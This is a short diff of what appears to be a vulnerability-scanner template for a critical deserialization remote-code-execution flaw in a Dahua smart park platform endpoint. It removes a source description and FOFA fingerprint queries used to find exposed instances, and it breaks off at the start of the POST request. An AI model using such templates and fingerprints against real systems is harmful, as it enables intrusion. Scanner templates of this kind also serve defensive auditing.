@@ -3,12 +3,8 @@ info:
   name: 大华智慧园区综合管理平台 accessmodifyOrg.action 存在反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/om9pc5qf9wk6d4oq'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: om9pc5qf9wk6d4oq
-    fofa: body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\"" || body="/WPMS/asset/lib/html5shiv.js" || body="/WPMS/asset/img/black/zhyq.png" || body="/WPMS/asset/common/css/base.css" || body="/WPMS/asset/lib
 http:
 - raw:
   - 'POST /admin/accessmodifyOrg.action HTTP/1.1
